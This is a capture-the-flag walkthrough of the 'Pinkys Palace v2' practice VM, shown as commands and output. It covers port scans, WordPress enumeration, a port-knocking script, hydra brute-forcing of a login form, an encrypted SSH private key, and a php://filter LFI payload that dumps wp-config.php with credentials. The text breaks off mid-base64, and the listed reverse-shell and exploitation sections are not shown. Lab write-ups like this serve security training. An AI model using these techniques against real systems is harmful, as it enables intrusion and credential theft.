#### Pinkys Palace v2

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [Port Knocking](#port-knocking)
- [LFI](#lfi)
- [Reverse Shell](#reverse-shell)
- [Crack SSH keys](#crack-ssh-keys)
- [Binary Exploitation](#binary-exploitation)
- [References](#references)

###### Attacker Info

```sh
root@kali:~/Pinkys-Palace2# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.17  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 343  bytes 162203 (158.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 185  bytes 22213 (21.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 82  bytes 29469 (28.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 82  bytes 29469 (28.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/Pinkys-Palace2#
```

###### Nmap Scan

```sh
root@kali:~/Pinkys-Palace2# nmap -sV -sC -oA pinkypalace2.nmap -p- -T5 192.168.1.26

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-29 11:41 EDT
Nmap scan report for 192.168.1.26
Host is up (0.00084s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:C9:32:4F (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# nmap -p- -T5 192.168.1.26

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-29 12:06 EDT
Nmap scan report for 192.168.1.26
Host is up (0.0014s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:C9:32:4F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
root@kali:~/Pinkys-Palace2#
```

###### Web Enumeration

```
http://192.168.1.26/
```

![](images/1.png)

![](images/2.png)

```sh
root@kali:~/Pinkys-Palace2# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

192.168.1.26	pinkydb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# ping pinkydb
PING pinkydb (192.168.1.26) 56(84) bytes of data.
64 bytes from pinkydb (192.168.1.26): icmp_seq=1 ttl=64 time=0.497 ms
64 bytes from pinkydb (192.168.1.26): icmp_seq=2 ttl=64 time=0.625 ms
64 bytes from pinkydb (192.168.1.26): icmp_seq=3 ttl=64 time=0.560 ms
^C
--- pinkydb ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2029ms
rtt min/avg/max/mdev = 0.497/0.560/0.625/0.058 ms
root@kali:~/Pinkys-Palace2#
```

```
http://pinkydb
```

![](images/3.png)

```sh
root@kali:~/Pinkys-Palace2# wpscan --url pinkydb --enumerate p,t,u,tt --log wpscan-pinky
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]Y
[i] Updating the Database ...
[i] Update completed.
[+] URL: http://pinkydb/
[+] Started: Sun Apr 29 12:19:01 2018

[!] The WordPress 'http://pinkydb/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.25 (Debian)
[+] XML-RPC Interface available under: http://pinkydb/xmlrpc.php
[!] Includes directory has directory listing enabled: http://pinkydb/wp-includes/

[+] WordPress version 4.9.4 (Released on 2018-02-06) identified from meta generator, links opml
[!] 4 vulnerabilities identified from the version number

[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9021
    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
    Reference: https://github.com/quitten/doser.py
    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
    Reference: https://wpvulndb.com/vulnerabilities/9053
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
    Reference: https://wpvulndb.com/vulnerabilities/9054
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
[i] Fixed in: 4.9.5

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
    Reference: https://wpvulndb.com/vulnerabilities/9055
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
[i] Fixed in: 4.9.5

[+] WordPress theme in use: twentyseventeen - v1.4

[+] Name: twentyseventeen - v1.4
 |  Last updated: 2018-04-03T00:00:00.000Z
 |  Location: http://pinkydb/wp-content/themes/twentyseventeen/
 |  Readme: http://pinkydb/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.5
 |  Style URL: http://pinkydb/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones marked as popular) ...

   Time: 00:00:02 <===================================================================================================================================================> (1497 / 1497) 100.00% Time: 00:00:02

[+] We found 1 plugins:

[+] Name: akismet - v4.0.2
 |  Last updated: 2018-02-19T15:25:00.000Z
 |  Location: http://pinkydb/wp-content/plugins/akismet/
 |  Readme: http://pinkydb/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 4.0.3

[+] Enumerating installed themes (only ones marked as popular) ...

   Time: 00:00:00 <=====================================================================================================================================================> (400 / 400) 100.00% Time: 00:00:00

[+] We found 1 themes:

[+] Name: twentyseventeen - v1.4
 |  Last updated: 2018-04-03T00:00:00.000Z
 |  Location: http://pinkydb/wp-content/themes/twentyseventeen/
 |  Readme: http://pinkydb/wp-content/themes/twentyseventeen/README.txt
[!] The version is out of date, the latest version is 1.5
 |  Style URL: http://pinkydb/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating timthumb files ...

   Time: 00:00:03 <===================================================================================================================================================> (2541 / 2541) 100.00% Time: 00:00:03

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+

[+] Finished: Sun Apr 29 12:19:14 2018
[+] Requests Done: 4838
[+] Memory used: 44.797 MB
[+] Elapsed time: 00:00:13
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://pinkydb -t 200

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://pinkydb/
[+] Threads      : 200
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/wordpress (Status: 301)
/wp-includes (Status: 301)
/wp-content (Status: 301)
/secret (Status: 301)
/wp-admin (Status: 301)
=====================================================
root@kali:~/Pinkys-Palace2#
```

```
http://pinkydb/secret/
http://pinkydb/secret/bambam.txt
```

![](images/4.png)

![](images/5.png)

```
http://pinkydb/wordpress
```

![](images/6.png)

![](images/7.png)


```sh
root@kali:~/Pinkys-Palace2# service mysql start
root@kali:~/Pinkys-Palace2# service mysql status
● mysql.service - LSB: Start and stop the mysql database server daemon
   Loaded: loaded (/etc/init.d/mysql; generated; vendor preset: disabled)
   Active: active (running) since Sun 2018-04-29 12:27:10 EDT; 6s ago
     Docs: man:systemd-sysv-generator(8)
  Process: 2435 ExecStart=/etc/init.d/mysql start (code=exited, status=0/SUCCESS)
    Tasks: 29 (limit: 4915)
   CGroup: /system.slice/mysql.service
           ├─2462 /bin/bash /usr/bin/mysqld_safe
           ├─2606 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/i386-linux-gnu/mariadb18/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socke
           └─2607 logger -t mysqld -p daemon error

Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: Processing databases
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: information_schema
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: mysql
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: performance_schema
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: Phase 6/7: Checking and upgrading tables
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: Processing databases
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: information_schema
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: performance_schema
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: Phase 7/7: Running 'FLUSH PRIVILEGES'
Apr 29 12:27:10 kali /etc/mysql/debian-start[2669]: OK
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# mysql -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 44
Server version: 10.1.29-MariaDB-6 Debian buildd-unstable

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> CREATE USER 'kan1shka9'@'pinkydb' IDENTIFIED BY 'please.subscribe';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> CREATE DATABASE pinky;
Query OK, 1 row affected (0.00 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON pinky.* TO 'kan1shka9'@'pinkydb';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]>
```

![](images/8.png)

![](images/9.png)

```sh
root@kali:/etc/mysql# netstat -lvnp | grep 3306
netstat: no support for `AF INET (sctp)' on this system.
netstat: no support for `AF INET (sctp)' on this system.
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      2606/mysqld
netstat: no support for `AF IPX' on this system.
netstat: no support for `AF AX25' on this system.
netstat: no support for `AF X25' on this system.
netstat: no support for `AF NETROM' on this system.
netstat: no support for `AF ROSE' on this system.
root@kali:/etc/mysql#
```

```sh
root@kali:~# cd /etc/mysql/
root@kali:/etc/mysql# grep -R 127.0.0.1 .
./mariadb.conf.d/50-server.cnf:bind-address		= 127.0.0.1
root@kali:/etc/mysql#
```

```sh
root@kali:/etc/mysql# vi mariadb.conf.d/50-server.cnf
```

![](images/10.png)

```sh
root@kali:/etc/mysql# service mysql restart
```

```sh
root@kali:/etc/mysql# netstat -lvnp | grep 3306
netstat: no support for `AF INET (sctp)' on this system.
netstat: no support for `AF INET (sctp)' on this system.
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      3109/mysqld
netstat: no support for `AF IPX' on this system.
netstat: no support for `AF AX25' on this system.
netstat: no support for `AF X25' on this system.
netstat: no support for `AF NETROM' on this system.
netstat: no support for `AF ROSE' on this system.
root@kali:/etc/mysql#
```

![](images/11.png)

![](images/12.png)

###### Port Knocking

`knock.py`

```python
from itertools import permutations
from scapy.all import *
import socket

def SendPkt(ip, port):
    ip = IP(src="192.168.1.17", dst=ip)
    SYN = TCP(sport=64349, dport=port, flags="S", seq=12345)
    send(ip/SYN)

def TestPort(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    return result

ports = [8890,7000,666]
for ports in permutations(ports):
    for port in ports:
        SendPkt("192.168.1.26", port)
```

```sh
➜  Desktop python3 knock.py
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
➜  Desktop
```

```sh
root@kali:~/Pinkys-Palace2# nmap -p- 192.168.1.26

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-29 13:44 EDT
Nmap scan report for pinkydb (192.168.1.26)
Host is up (0.00043s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
MAC Address: 00:0C:29:C9:32:4F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.13 seconds
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# nmap -sV -sC -oA pinky-palace-knock.nmap -p- 192.168.1.26

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-29 13:51 EDT
Nmap scan report for pinkydb (192.168.1.26)
Host is up (0.0033s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (EdDSA)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Pinkys Database
31337/tcp open  Elite?
| fingerprint-strings:
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   NULL:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|_    into Pinky's Palace.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.60%I=7%D=4/29%Time=5AE6062C%P=i686-pc-linux-gnu%r(NUL
SF:L,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\
SF:x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n
SF:=>\x20\0")%r(GetRequest,6B,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x2
SF:0\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x2
SF:0Pinky's\x20Palace\.\n=>\x20\0GET\x20/\x20HTTP/1\.0\r\n\r\n");
MAC Address: 00:0C:29:C9:32:4F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.93 seconds
root@kali:~/Pinkys-Palace2#
```

```
http://pinkydb:7654/
http://pinkydb:7654/login.php
```

![](images/13.png)

![](images/14.png)

```sh
root@kali:~/Pinkys-Palace2# cat login.req
POST /login.php HTTP/1.1
Host: pinkydb:7654
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pinkydb:7654/login.php
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

user=admin&pass=password



root@kali:~/Pinkys-Palace2#
```

![](images/15.png)

![](images/16.png)

```sh
root@kali:~/Pinkys-Palace2# cewl http://pinkydb -m 6 -w wordpress-password-list.txt
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:~/Pinkys-Palace2#
root@kali:~/Pinkys-Palace2# less wordpress-password-list.txt
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# cat users
pinkydb
pinky
pinky1337
root
guest
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# hydra -L users -P wordpress-password-list.txt pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Username"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-29 14:09:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 410 login tries (l:5/p:0), ~82 tries per task
[DATA] attacking http-post-form://pinkydb:7654//login.php:user=^USER^&pass=^PASS^:Invalid Username
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
[7654][http-post-form] host: pinkydb   login: pinky1337   password: content
[7654][http-post-form] host: pinkydb   login: root   password: WordPress
[7654][http-post-form] host: pinkydb   login: guest   password: WordPress
1 of 1 target successfully completed, 4 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-04-29 14:09:47
root@kali:~/Pinkys-Palace2#
```

```
http://pinkydb:7654/login.php
```

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

```sh
root@kali:~/Pinkys-Palace2# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BAC2C72352E75C879E2F26CC61A5B6E7

lyydl9wiTvUrlM7SXBKgMEP5tCK70Rce65i9sr7rxHmWm91uzd2GYBgSqGRIiPLP
hJdRi8HyRIz+1tf2FPoBvkjWl+WyRPpoVovXfEjL6lVvak6W1eNOuaGBjKT+8eaF
JC62d1ozuEM2eqpPcsVp8puwzP8Q77zYpZK9IOUo3xiupv4RrnBEGPYjaC1lLFRo
zlvUtoTnRQ0QCrjYuaL7EYQ1iBWoNc5ZMn1gqhBqQ/oE7/ff4eGhtG2i1LdscVf9
syk6ZBWFFA1wqlb2Vgv5Mn5BHx27GILo7o6yZzyxAuc02oJBnrg5Btlu/Tyx8ADV
ZR70DVA3q+/UoinxJCvH3zdKzOgzqHR9rdj5hiO6Np0Qzg//aWagrij5GqBpjCEt
aY2GxxXQQ8flNelYMvdcjHvZrjW8rKwU0nhyalu0+nFnLnHH6tMvAE6oqeIxIOO6
iJD7yUTrGfz0T7lRJQ7KQfeDQH+KGKgibLi60XWKQanRmrCiMLKnidLCjctyqsgh
lm5gPpqzw8CuPQ3EqPWIHYoDPak7Mk6SfpZaC+HQRauMbQqy5crP9YTtU1ZqRgdq
MsW7gnawwpTiE2cAR+AW9Cmy/n+cWoDvn+ceSrT1q81AjL1rKFSmwLWjKiKgJHER
Kv3zSMoBEzOGKAnQ5UOwOZPX+qQVGba+CJ2sZMdynd9HZrcMD29H4CLGO+VFggqs
3XUvpIcT4Arx9fVIk3hs6XeAnCOhj5f9Q2F4JnbqPdkQzBNJHCnrE8Rl4ymQl6lF
y/hvGWmDEtbockdNHGH9vF22kZuNmGKRROfYN5pmJYD9/L3RIvcC+UGDVojeUt/A
GDvjS8QhfNRwDUwTYHSUmIkz4fQt8g2bp3EixA/EH9IXV0HoBEtPzeaclqJJRBpW
WZK54Uj51hoqymDTfhS5HAwS6XaiN+SXyfXbZAqHMOTlegYNsGsYpGMXIB1oK+OL
lSwZimExQ042jVe4gxZ0ku3Qh/utmGUf3Rf7Ksng42tSt6uaVblXxO1JRPrI/ARt
5b7CjPBBZtIXUbtPF0/mw0q0tVZH/9BWjTvvAiMPlBvFwmujGKS+BA1krTz6YErY
ifoKTISVWsz7H1p4Xn1YD0sqfFtm2TSzsDj+x1Bpw4KXwquAoRfL61F6hVQKhyaV
8H6XaJCKuj8W2RhSe32pO7/MNYyCatZz5OtUt0XHYGf2EEOkihq8hecXpzHK0pnL
RcfhpffVDMjVV70Sl54WM9mqLHRzUWZZhAUehZkKrsou0LHoTrkWkYShrT1sc7uI
LoiicfuXpWegqXYKLSTY6YVn5iKov/eE3W3mxD/MIO4Fmi4VAcCp2EwXUlwQY8jI
839VYkApkA31uNNfp4GQw7ANqsopjN6bKIPpp8FVdCbgg7DlGZUuf/4cnXOc6gDA
K4+6vpcwC4AnJVsBfgjOmWajYple0zmDkQNkj+UptG8uC7VDwcd4FBfP+ISO1LID
MtLdf1/3qMbDQsqbdHXtZs2P84CvbJ2CPfHvTrG30JfXWuZoinMXtGwxY7x/IR0V
EHc/fHCThXM7op4q0MccCJPrhPIhwrM+dHasJGsmLlyy/Oe62c2Hx2Rh09xcU0JF
-----END RSA PRIVATE KEY-----
root@kali:~/Pinkys-Palace2#
```

###### LFI

![](images/21.png)

![](images/22.png)

```
php://filter/convert.base64-encode/resource=/var/www/html/apache/wp-config.php
```

![](images/23.png)

```sh
root@kali:~/Pinkys-Palace2# find /etc | grep -i sites
/etc/apache2/sites-enabled
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-available
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-available/default-ssl.conf
/etc/nginx/sites-enabled
/etc/nginx/sites-enabled/default
/etc/nginx/sites-available
/etc/nginx/sites-available/default
root@kali:~/Pinkys-Palace2#
```

![](images/24.png)

```sh
root@kali:~/Pinkys-Palace2# cat wp-config.php.b64
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vY29kZXgud29yZHByZXNzLm9yZy9FZGl0aW5nX3dwLWNvbmZpZy5waHANCiAqDQogKiBAcGFja2FnZSBXb3JkUHJlc3MNCiAqLw0KDQovLyAqKiBNeVNRTCBzZXR0aW5ncyAtIFlvdSBjYW4gZ2V0IHRoaXMgaW5mbyBmcm9tIHlvdXIgd2ViIGhvc3QgKiogLy8NCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCdEQl9OQU1FJywgJ3B3cF9kYicpOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSgnREJfVVNFUicsICdwaW5reXdwJyk7DQoNCi8qKiBNeVNRTCBkYXRhYmFzZSBwYXNzd29yZCAqLw0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICdwaW5reWRicGFzc193cCcpOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSgnREJfSE9TVCcsICdsb2NhbGhvc3QnKTsNCg0KLyoqIERhdGFiYXNlIENoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSgnREJfQ0hBUlNFVCcsICd1dGY4bWI0Jyk7DQoNCi8qKiBUaGUgRGF0YWJhc2UgQ29sbGF0ZSB0eXBlLiBEb24ndCBjaGFuZ2UgdGhpcyBpZiBpbiBkb3VidC4gKi8NCmRlZmluZSgnREJfQ09MTEFURScsICcnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCdBVVRIX0tFWScsICAgICAgICAgJ1NgXikxek9CWnpgbFhKbGZfSWdGTGVoQE99LXkrOXRHe20lemVAbyk1Nyg5WikhcStmQClAQUNsX15bVG4ydConKTsNCmRlZmluZSgnU0VDVVJFX0FVVEhfS0VZJywgICdxKXBQV1RFQkpeXzopUSpUek5xQnVYVS0uMXhSdzoqYlBaQVIhTDAvfndOY0lhLDRWQDhtNDNqZSpzJWZ4VCV1Jyk7DQpkZWZpbmUoJ0xPR0dFRF9JTl9LRVknLCAgICAnIGo/RFc0TSN2N3lsQWtRWGVjKC9hXTNYR0EjYnJvQ2x0VWRIeH5pdjF+SSEtWS1RITJqS3BmYVk9YnBgJj5kWicpOw0KZGVmaW5lKCdOT05DRV9LRVknLCAgICAgICAgJzpPfjkhMixQbXFbS2NobmFmdFg4LT4rWUA0WX5mdmlddjJXSFp8KSAvJW5qbk5VUVogck10akN+QDZMZHs7Z0wnKTsNCmRlZmluZSgnQVVUSF9TQUxUJywgICAgICAgICdSRzNvRj4kYl8wd0E+W1tOPns1fEt2PVE1cy5QanZQc2dHOShVej9jTFhpMDpmYEg7MTpQJUU9TGRXVkt9QklhJyk7DQpkZWZpbmUoJ1NFQ1VSRV9BVVRIX1NBTFQnLCAnMl5UOCAgblU+TEcpNiY3YnA8UWVAQk5kMDNgYH1UI0decEA0XVpsYz1xdDYwVWpeP30kLS9SdThlbjI7bHp8cycpOw0KZGVmaW5lKCdMT0dHRURfSU5fU0FMVCcsICAgJzRFKSglcW5wK1UzOXolOjMzMihrWis6KzNPYmt7QEEgUTVNVnRILXNdTCFSIVE4eUo9MDNOJGEsOmlAO2Q9UEQnKTsNCmRlZmluZSgnTk9OQ0VfU0FMVCcsICAgICAgICc5Q0Y4PWNCME4+UGJ2IE5GZWIxJl1ZYklWLyU1aDNLQyZldklpfi5kLlpeYnByRjdsZGdlciQmIGo7LEspdkJkJyk7DQoNCi8qKiNALSovDQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqDQogKiBZb3UgY2FuIGhhdmUgbXVsdGlwbGUgaW5zdGFsbGF0aW9ucyBpbiBvbmUgZGF0YWJhc2